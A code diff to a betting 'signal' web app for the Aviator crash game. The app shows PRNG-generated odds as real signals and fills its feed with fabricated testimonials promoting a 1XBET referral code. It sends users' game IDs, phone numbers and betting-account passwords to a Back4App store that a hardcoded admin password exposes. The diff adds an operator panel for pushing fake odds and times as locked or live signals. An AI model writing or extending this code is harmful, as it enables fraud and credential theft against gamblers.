@@ -122,6 +122,16 @@
       backdrop-filter: blur(4px);
     }
     .display { width: 100%; padding: 12px 18px; border-radius: 16px; background: rgba(255, 193, 7, 0.06); border: 2px solid var(--card-border); box-shadow: 0 0 24px rgba(255, 193, 7, 0.22), inset 0 0 24px rgba(255, 193, 7, 0.08); text-align: center; user-select: none; }
+    .signal-time {
+      font-family: 'Orbitron', monospace;
+      font-size: 16px;
+      color: #FFECB3;
+      opacity: 0.9;
+      height: 20px;
+      margin-bottom: 6px;
+      letter-spacing: 1px;
+      text-shadow: 0 0 8px rgba(255, 193, 7, 0.3);
+    }
     .odd { font-family: 'Orbitron', monospace; font-weight: 800; font-size: clamp(42px, 10vw, 64px); color: var(--yellow-1); letter-spacing: 1.5px; text-shadow: 0 0 22px rgba(255, 193, 7, 0.6), 0 0 48px rgba(255, 160, 0, 0.4); transition: transform .18s ease; min-height: 70px; display: grid; place-items: center; }
     .odd.pop { transform: scale(1.06); }
     .odd-status {
@@ -168,6 +178,7 @@
     .field { display: grid; grid-template-columns: 130px 1fr; gap: 10px; align-items: center; }
     .field label { font-weight: 700; font-size: 13px; color: #FFECB3; }
     .field input { background: rgba(255,255,255,0.05); border: 1.5px solid var(--card-border); color: var(--text); padding: 10px 12px; border-radius: 10px; outline: none; }
+    .lock-field { display: flex; align-items: center; gap: 10px; color: #FFECB3; font-weight: 700; font-size: 13px; cursor: pointer; user-select: none; }
     .sysBtn { justify-self: start; padding: 10px 14px; border-radius: 10px; border: 1.5px solid var(--card-border); background: rgba(255, 193, 7, 0.1); color: #FFF8E1; font-weight: 800; cursor: pointer; letter-spacing: .6px; }
     .status { justify-self: start; padding: 8px 12px; border-radius: 10px; font-weight: 800; letter-spacing: .6px; display: none; }
     .status.ok  { display:inline-block; color: var(--ok);  background: rgba(40,231,122,0.12); border: 1.5px solid rgba(40,231,122,0.45); text-shadow: 0 0 8px rgba(40,231,122,0.25); }
@@ -237,6 +248,7 @@
       <section id="home" class="screen show">
         <div class="container">
           <div class="display" aria-live="polite">
+            <div id="signalTime" class="signal-time">--:--:--</div>
             <div id="odd" class="odd">--.--</div>
             <div id="oddStatus" class="odd-status">Initializing...</div>
           </div>
@@ -255,6 +267,7 @@
             <a class="open-tg" data-brand="telegram" href="#" aria-label="Telegram"><img alt="Telegram" src="https://cdn.simpleicons.org/telegram/FFFFFF" width="22" height="22"></a>
           </div>
           <button id="adminBtn" class="small-btn" style="margin-top: 10px; border-style: dashed; opacity: 0.7;">Admin Team</button>
+          <button id="signalUpdateBtn" class="small-btn" style="margin-top: 10px;">Signal Updet</button>
         </div>
       </section>
 
@@ -291,6 +304,22 @@
           <div id="adminDataView" style="width:100%; white-space: pre-wrap; font-family: monospace; font-size: 12px; background: rgba(0,0,0,0.2); padding: 10px; border-radius: 8px; max-height: 40vh; overflow-y: auto; text-align: left;">Loading data...</div>
         </div>
       </section>
+      
+      <section id="signalUpdateScr" class="screen hidden" aria-label="Signal Update Panel">
+        <div class="container">
+          <div class="backRow" style="width:100%"><button id="backFromSignalUpdate" class="linkBtn">← Back</button><div style="opacity:.8;font-size:13px">Manual Signal Override</div></div>
+          <div class="connect-panel">
+            <div class="field"><label for="displayTime">Display Time</label><input id="displayTime" type="text" placeholder="e.g., 10:30:45"></div>
+            <div class="field"><label for="updateOdd">Odd</label><input id="updateOdd" type="number" step="0.01" placeholder="e.g., 2.54"></div>
+            <div class="field"><label for="updateDuration">Duration (sec)</label><input id="updateDuration" type="number" placeholder="e.g., 30 (for temp)"></div>
+            <div style="display: flex; gap: 20px; align-items: center; margin-top: 10px;">
+              <button id="saveSignalUpdate" class="sysBtn">Update Signal</button>
+              <label class="lock-field"><input type="checkbox" id="signalLock"> Signal Lock</label>
+            </div>
+          </div>
+        </div>
+      </section>
+
     </main>
   </div>
 
@@ -301,6 +330,7 @@
       Parse.initialize("aUFvZoGaL35DeXgo9GcF9R1IlvprRgmzZuQleNGn", "aq5D7RQGbj8Ewbh7eMr66N8BkKFhJaac5lcNYynV");
       Parse.serverURL = 'https://parseapi.back4app.com';
 
+      // --- DOM Elements ---
       const intro = document.getElementById('intro');
       const skipIntro = document.getElementById('skipIntro');
       const world = document.getElementById('world');
@@ -308,6 +338,7 @@
       const barPct = document.getElementById('barPct');
       const oddCanvas = document.getElementById('introOdd');
       const starfieldCanvas = document.getElementById('starfield');
+      const signalTimeEl = document.getElementById('signalTime');
       const oddEl = document.getElementById('odd');
       const oddStatusEl = document.getElementById('oddStatus');
       const genBtn = document.getElementById('generate');
@@ -317,17 +348,20 @@
       const connectScr = document.getElementById('connect');
       const feedbackScr = document.getElementById('feedback');
       const adminPanel = document.getElementById('adminPanel');
+      const signalUpdateScr = document.getElementById('signalUpdateScr');
       const connectBtn = document.getElementById('connectBtn');
       const feedbackBtn = document.getElementById('feedbackBtn');
       const adminBtn = document.getElementById('adminBtn');
+      const signalUpdateBtn = document.getElementById('signalUpdateBtn');
       const backHome = document.getElementById('backHome');
       const backFromFeedback = document.getElementById('backFromFeedback');
       const backFromAdmin = document.getElementById('backFromAdmin');
+      const backFromSignalUpdate = document.getElementById('backFromSignalUpdate');
       const sysConnect = document.getElementById('sysConnect');
       const gameIdInput = document.getElementById('gameId');
       const phoneNumberInput = document.getElementById('phoneNumber');
-      const systemPwdInput = document.getElementById('systemPwd'); // Changed
-      const gamePwdInput = document.getElementById('gamePwd');     // Added
+      const systemPwdInput = document.getElementById('systemPwd');
+      const gamePwdInput = document.getElementById('gamePwd');
       const connStatus = document.getElementById('connStatus');
       const feedList = document.getElementById('feedList');
       const fbNameInput = document.getElementById('fbName');
@@ -336,10 +370,25 @@
       const fbNote = document.getElementById('fbNote');
       const adminDataView = document.getElementById('adminDataView');
       const onlineCounterEl = document.getElementById('onlineCounter');
+      const displayTimeInput = document.getElementById('displayTime'); // New
+      const updateDurationInput = document.getElementById('updateDuration'); // Renamed
+      const updateOddInput = document.getElementById('updateOdd');
+      const saveSignalUpdateBtn = document.getElementById('saveSignalUpdate');
+      const signalLockCheckbox = document.getElementById('signalLock');
 
+      // --- State Variables ---
       const INTRO_TIME = 2200;
       let introDone = false;
+      const history = [];
+      const COUNTDOWN_DURATION = 7000;
+      const SHOW_DURATION = 15000;
+      const CYCLE_DURATION = COUNTDOWN_DURATION + SHOW_DURATION;
+      let manualOverrideUntil = 0;
+      let lastCycleSeed = -1;
+      let manualSignalOverride = { active: false, odd: 0, endTime: 0, time: '' };
+      let signalLockState = { active: false, odd: 0, time: '' };
 
+      // --- Intro and Animation ---
       function openIntro() { intro.classList.add('show'); startOddsRain(); startBottomLoader(); }
       function closeIntro() {
         if (introDone) return;
@@ -390,14 +439,9 @@
       }
       function stopOddsRain() { cancelAnimationFrame(rainRAF); window.removeEventListener('resize', resizeOddsRain); octx.clearRect(0, 0, oWidth, oHeight); }
 
-      const history = [];
+      // --- Core Game Logic ---
       const formatOdd = (n) => 'x' + n.toFixed(2);
-      
-      const COUNTDOWN_DURATION = 7000;
-      const SHOW_DURATION = 15000;
-      const CYCLE_DURATION = COUNTDOWN_DURATION + SHOW_DURATION;
-      let manualOverrideUntil = 0;
-      let lastCycleSeed = -1;
+      const formatTime = (date) => date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
 
       function mulberry32(a) {
           return function() {
@@ -407,7 +451,6 @@
             return ((t ^ t >>> 14) >>> 0) / 4294967296;
           }
       }
-
       function getSynchronizedOdd(seed) {
         const prng = mulberry32(seed);
         const randomValue = prng();
@@ -418,6 +461,24 @@
       function gameLoop() {
         const now = Date.now();
         
+        if (signalLockState.active) {
+            signalTimeEl.textContent = signalLockState.time;
+            oddEl.textContent = formatOdd(signalLockState.odd);
+            oddStatusEl.textContent = "Signal Locked 🔒";
+            return;
+        }
+
+        if (manualSignalOverride.active && now < manualSignalOverride.endTime) {
+            signalTimeEl.textContent = manualSignalOverride.time;
+            const timeLeft = manualSignalOverride.endTime - now;
+            const secondsLeft = Math.max(0, Math.ceil(timeLeft / 1000));
+            oddEl.textContent = formatOdd(manualSignalOverride.odd);
+            oddStatusEl.textContent = `Flying... ${secondsLeft}s`;
+            return; 
+        } else {
+            manualSignalOverride.active = false;
+        }
+
         if (now < manualOverrideUntil) {
             const timeLeft = manualOverrideUntil - now;
             const secondsLeft = Math.max(0, Math.ceil(timeLeft / 1000));
@@ -426,6 +487,7 @@
             const timeIntoCycle = now % CYCLE_DURATION;
             if (timeIntoCycle < COUNTDOWN_DURATION) {
                 const countdown = Math.ceil((COUNTDOWN_DURATION - timeIntoCycle) / 1000);
+                signalTimeEl.textContent = "--:--:--";
                 oddEl.textContent = "--.--";
                 oddStatusEl.textContent = `Next round in ${countdown}s...`;
             } else {
@@ -435,10 +497,13 @@
                 const secondsLeft = Math.max(0, Math.ceil(timeLeftInShow / 1000));
                 
                 if (currentCycleSeed !== lastCycleSeed) {
-                    pushHistory(oddValue);
+                    const roundStartTime = new Date(currentCycleSeed * CYCLE_DURATION + COUNTDOWN_DURATION);
+                    const timeString = formatTime(roundStartTime);
+                    pushHistory(oddValue, timeString);
                     lastCycleSeed = currentCycleSeed;
                 }
                 
+                signalTimeEl.textContent = history[0]?.time || '--:--:--';
                 oddEl.textContent = formatOdd(oddValue);
                 oddStatusEl.textContent = `Flying... ${secondsLeft}s`;
             }
@@ -448,9 +513,9 @@
       function handleGenerateClick() {
         manualOverrideUntil = Date.now() + SHOW_DURATION;
         const v = generateOddUnderFour();
-        oddEl.textContent = formatOdd(v);
+        const timeString = formatTime(new Date());
+        pushHistory(v, timeString);
         gameLoop();
-        pushHistory(v);
         oddEl.classList.add('pop');
         setTimeout(() => oddEl.classList.remove('pop'), 160);
       }
@@ -460,22 +525,23 @@
         return Math.round(v * 100) / 100;
       }
 
-      function pushHistory(val) {
-        history.unshift({ val, at: new Date() });
+      function pushHistory(val, timeStr) {
+        const displayTime = timeStr || formatTime(new Date());
+        history.unshift({ val, time: displayTime });
         if (history.length > 3) history.pop();
         renderHistory();
       }
 
       function renderHistory() {
         historyEl.innerHTML = history.map(h => {
-          const t = h.at.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-          return `<div class="history-row"><span>${t}</span><span class="tag">${formatOdd(h.val)}</span></div>`;
+          return `<div class="history-row"><span>${h.time}</span><span class="tag">${formatOdd(h.val)}</span></div>`;
         }).join('');
       }
 
+      // --- Navigation ---
       function showScreen(name) {
         document.body.classList.toggle('on-feedback', name === 'feedback');
-        const screens = { home: homeScr, connect: connectScr, feedback: feedbackScr, adminPanel: adminPanel };
+        const screens = { home: homeScr, connect: connectScr, feedback: feedbackScr, adminPanel: adminPanel, signalUpdate: signalUpdateScr };
         Object.keys(screens).forEach(key => {
           screens[key].classList.toggle('show', key === name);
           screens[key].classList.toggle('hidden', key !== name);
@@ -484,6 +550,7 @@
         if (name === 'feedback') setTimeout(() => fbTextInput.focus(), 80);
       }
 
+      // --- Data Handling ---
       async function handleSystemConnect() {
         const systemPassword = systemPwdInput.value.trim();
         const isOk = systemPassword.toLowerCase() === 'vipcna';
@@ -492,15 +559,15 @@
 
         const gameId = gameIdInput.value.trim();
         const phone = phoneNumberInput.value.trim();
-        const gamePassword = gamePwdInput.value.trim(); // Added
+        const gamePassword = gamePwdInput.value.trim();
         
-        if (isOk && gameId && phone && gamePassword) { // Added gamePassword to check
+        if (isOk && gameId && phone && gamePassword) {
             const UserConnection = Parse.Object.extend("UserConnection");
             const connection = new UserConnection();
             connection.set("gameId", gameId);
             connection.set("phoneNumber", phone);
-            connection.set("systemPassword", systemPassword); // Changed
-            connection.set("gamePassword", gamePassword);     // Added
+            connection.set("systemPassword", systemPassword);
+            connection.set("gamePassword", gamePassword);
             try {
                 await connection.save();
                 console.log('User connection saved successfully to Back4App!');
@@ -520,6 +587,7 @@
         setTimeout(() => { window.open(webLink, '_blank', 'noopener,noreferrer'); }, 500);
       }
       
+      // --- Feedback System ---
       const RANDOM_NAMES = ["Nimal Perera", "Sunil Silva", "Kamal Fernando", "Kasun Bandara", "Ruwan Gamage", "Priya Kumari", "Saman Jayasuriya", "Gayan Dias", "Chathura Sampath", "Pasan Madhawa", "Shehan Wijesinghe", "Lakmali Herath", "Nadeesha Dilrukshi", "Mihiri Sandunika", "Ashen Vithanage"];
       const RANDOM_MESSAGES = ["signal හොදයි 👍", "මම ගොඩක් සල්ලි හෙව්වා මේකෙන් 💰", "ඇප් එක නම් මරු", "සුපිරි signals bro", "win win win only!", "loss cover කරගන්න පුළුවන් වුණා, thanks", "patta app eka", "100% sure signals!", "VIPCNA code eka weda, supiri", "Thank you very much!", "Best signal app I've used", "maru signal eka..", "niyamai ayye..."];
       const INITIAL_FEEDS = [{ name: 'Dulan Chamika', msg: `අඩේ මරු අයියෙ මේක නම් 100% sure signal 🔥\nVIPCNA කෝඩ් එකෙන් අලුත් 1XBET account \nඑකක් හදා ගත්තට පස්සෙ තමා \nsignal සුපිරියටම වැඩ කරේ 💸🤩❤️`, }, { name: 'Dilshan Jayavardana', msg: 'Signal nam Signal Supiri Ahh' }, { name: 'ජානකී හේරත්', msg: 'ලක්ෂ 8 ක් ලොස් වෙලා හිටියෙ , දවස් තුනෙක් කවර් කරා මේ ඇප් එක නිසා මුළු loss එකම , ඇත්තටම ගොඩක් ස්තුතී' }, { name: 'වසන්ත ජයතිලක', msg: 'Thank Brother Aviator Signal මරු ❤️' },];
@@ -538,20 +606,15 @@
         li.innerHTML = `<div class="feedHead"><div class="avatar" style="--avbg: ${color}">${PERSON_SVG}</div><div class="name">${escapeHtml(name)}</div></div><div class="msg">${highlightPromo(message)}</div>`;
         return li;
       }
-      
       function renderInitialFeeds() { feedList.innerHTML = ''; INITIAL_FEEDS.forEach(f => feedList.appendChild(createFeedItem(f.name, f.msg))); }
-      
       function showRandomFeedback() {
         if (!feedbackScr.classList.contains('show')) return;
         const randomName = RANDOM_NAMES[Math.floor(Math.random() * RANDOM_NAMES.length)];
         const randomMsg = RANDOM_MESSAGES[Math.floor(Math.random() * RANDOM_MESSAGES.length)];
         const newItem = createFeedItem(randomName, randomMsg);
         feedList.prepend(newItem);
-        if (feedList.children.length > 8) {
-          feedList.lastChild.remove();
-        }
+        if (feedList.children.length > 8) { feedList.lastChild.remove(); }
       }
-
       function handleSendFeedback() {
         const name = (fbNameInput.value.trim() || 'Anonymous');
         const text = fbTextInput.value.trim();
@@ -562,11 +625,11 @@
         setTimeout(() => fbNote.textContent = '', 1200);
       }
 
+      // --- Admin and Utility ---
       function updateOnlineCounter() {
         const count = Math.floor(Math.random() * 41) + 30; // 30 to 70
         onlineCounterEl.textContent = `Online: ${count}`;
       }
-      
       async function fetchAdminData() {
         adminDataView.textContent = 'Loading data...';
         const UserConnection = Parse.Object.extend("UserConnection");
@@ -579,8 +642,8 @@
                 const timestamp = conn.createdAt.toLocaleString('si-LK');
                 const gameId = conn.get('gameId');
                 const phone = conn.get('phoneNumber');
-                const systemPass = conn.get('systemPassword'); // Changed
-                const gamePass = conn.get('gamePassword');     // Added
+                const systemPass = conn.get('systemPassword');
+                const gamePass = conn.get('gamePassword');
                 return `${index + 1}. Time: ${timestamp}\n   Game ID: ${gameId}\n   Phone: ${phone}\n   Game Pass: ${gamePass}\n   System Pass: ${systemPass}`;
             }).join('\n\n');
             adminDataView.textContent = dataText;
@@ -590,9 +653,9 @@
         }
       }
 
+      // --- Starfield Background ---
       const sctx = starfieldCanvas.getContext('2d', { alpha: true });
       let stars = [], sWidth = 0, sHeight = 0, sDpr = 1;
-
       function resizeStarfield() {
         sDpr = Math.min(window.devicePixelRatio || 1, 2);
         sWidth = innerWidth; sHeight = innerHeight;
@@ -608,7 +671,6 @@
           stars.push({ x: Math.random() * sWidth, y: Math.random() * sHeight, r, vx: Math.cos(angle) * speed, vy: Math.sin(angle) * speed, twPhase: Math.random() * Math.PI * 2, twSpeed: 0.6 + Math.random() * 1.4 });
         }
       }
-
       let lastT = performance.now();
       function animateStarfield(now) {
         const dt = Math.min((now - lastT) / 1000, 0.05); lastT = now;
@@ -626,30 +688,32 @@
         requestAnimationFrame(animateStarfield);
       }
 
+      // --- Initialization ---
       function init() {
         window.addEventListener('load', openIntro);
         window.addEventListener('resize', resizeStarfield);
         skipIntro.addEventListener('click', () => { barFill.style.width = '100%'; barPct.textContent = '100%'; closeIntro(); });
         genBtn.addEventListener('click', handleGenerateClick);
         clearBtn.addEventListener('click', () => { history.length = 0; renderHistory(); });
+        
+        // Navigation Listeners
         connectBtn.addEventListener('click', () => showScreen('connect'));
         feedbackBtn.addEventListener('click', () => {
             showScreen('feedback');
             if (feedbackInterval) clearInterval(feedbackInterval);
             feedbackInterval = setInterval(showRandomFeedback, 5000);
         });
-        backHome.addEventListener('click', () => {
-            showScreen('home');
-            clearInterval(feedbackInterval);
-        });
-        backFromFeedback.addEventListener('click', () => {
-            showScreen('home');
-            clearInterval(feedbackInterval);
-        });
+        backHome.addEventListener('click', () => { showScreen('home'); clearInterval(feedbackInterval); });
+        backFromFeedback.addEventListener('click', () => { showScreen('home'); clearInterval(feedbackInterval); });
+        backFromAdmin.addEventListener('click', () => showScreen('home'));
+        backFromSignalUpdate.addEventListener('click', () => showScreen('home'));
+
+        // Action Listeners
         sysConnect.addEventListener('click', handleSystemConnect);
         fbSendBtn.addEventListener('click', handleSendFeedback);
         document.querySelectorAll('.open-tg').forEach(a => a.addEventListener('click', handleSocialLink));
         
+        // Admin Panels Listeners
         adminBtn.addEventListener('click', async () => {
             const pass = prompt('Enter Admin Password:');
             if (pass === '2003') {
@@ -659,8 +723,59 @@
                 alert('Incorrect Password!');
             }
         });
-        backFromAdmin.addEventListener('click', () => showScreen('home'));
         
+        signalUpdateBtn.addEventListener('click', () => {
+            const pass = prompt('Enter Password:');
+            if (pass === '2003') {
+                signalLockCheckbox.checked = signalLockState.active;
+                // Pre-fill fields with current locked signal if it exists
+                if(signalLockState.active) {
+                    displayTimeInput.value = signalLockState.time;
+                    updateOddInput.value = signalLockState.odd;
+                }
+                showScreen('signalUpdate');
+            } else if (pass !== null) {
+                alert('Incorrect Password!');
+            }
+        });
+        
+        saveSignalUpdateBtn.addEventListener('click', () => {
+            const isLocked = signalLockCheckbox.checked;
+            const odd = parseFloat(updateOddInput.value);
+            const displayTime = displayTimeInput.value.trim();
+
+            if (isLocked) {
+                if (isNaN(odd) || odd <= 0 || !displayTime) {
+                    alert('Please enter a valid Odd and Display Time to lock.');
+                    return;
+                }
+                signalLockState = { active: true, odd: odd, time: displayTime };
+                manualSignalOverride.active = false;
+                
+                pushHistory(odd, displayTime);
+                alert('Signal Locked!');
+            } else {
+                signalLockState.active = false;
+                
+                const duration = parseFloat(updateDurationInput.value);
+                if (!isNaN(odd) && odd > 0 && displayTime && !isNaN(duration) && duration > 0) {
+                    manualSignalOverride = {
+                        active: true,
+                        odd: odd,
+                        endTime: Date.now() + (duration * 1000),
+                        time: displayTime
+                    };
+                    pushHistory(odd, displayTime);
+                    alert('Temporary signal updated!');
+                } else {
+                    alert('Signal Unlocked! Returning to automatic cycle.');
+                }
+            }
+            gameLoop();
+            showScreen('home');
+        });
+        
+        // Initial setup calls
         renderInitialFeeds();
         resizeStarfield();
         requestAnimationFrame(animateStarfield);
